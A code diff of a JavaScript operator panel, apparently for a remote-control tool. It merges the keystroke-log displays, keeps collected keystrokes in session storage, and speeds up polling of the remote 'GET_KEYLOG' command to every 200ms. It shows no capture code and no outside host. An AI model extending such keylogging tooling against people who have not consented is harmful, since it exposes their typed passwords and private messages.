@@ -7,22 +7,11 @@ export function handleKeylogData(payload) {
   const chk = document.getElementById("chkKeylog");
   if (chk) chk.checked = payload.enabled;
 
-  // Xử lý LOG UNICODE (Khung trên)
-  if (payload.display) {
-    let areaDisplay = document.getElementById("logUnicode");
-    if (areaDisplay) {
-      areaDisplay.value += payload.display;
-      areaDisplay.scrollTop = areaDisplay.scrollHeight;
-    }
-  }
-
-  // Xử lý LOG RAW (Khung dưới)
-  if (payload.raw) {
-    let areaRaw = document.getElementById("logRaw");
-    if (areaRaw) {
-      areaRaw.value += payload.raw;
-      areaRaw.scrollTop = areaRaw.scrollHeight;
-    }
+  if (payload.log) {
+    let area = document.getElementById("logArea");
+    area.value += payload.log;
+    area.scrollTop = area.scrollHeight;
+    sessionStorage.setItem("keylogs", area.value);
   }
 }
 
@@ -38,7 +27,7 @@ export function toggleKeylog(cb) {
     if (!store.keylogInt)
       store.keylogInt = setInterval(() => {
         sendCommand("GET_KEYLOG");
-      }, 500); // Tăng lên 500ms cho đỡ spam
+      }, 200);
   } else {
     if (store.keylogInt) {
       clearInterval(store.keylogInt);
@@ -49,8 +38,8 @@ export function toggleKeylog(cb) {
 
 export function clearLogs() {
   showConfirm("Xóa nhật ký bàn phím (Client)?", () => {
-    document.getElementById("logUnicode").value = "";
-    document.getElementById("logRaw").value = "";
+    document.getElementById("logArea").value = "";
+    sessionStorage.removeItem("keylogs");
     logActionUI("Đã xóa log phím", true);
   });
 }
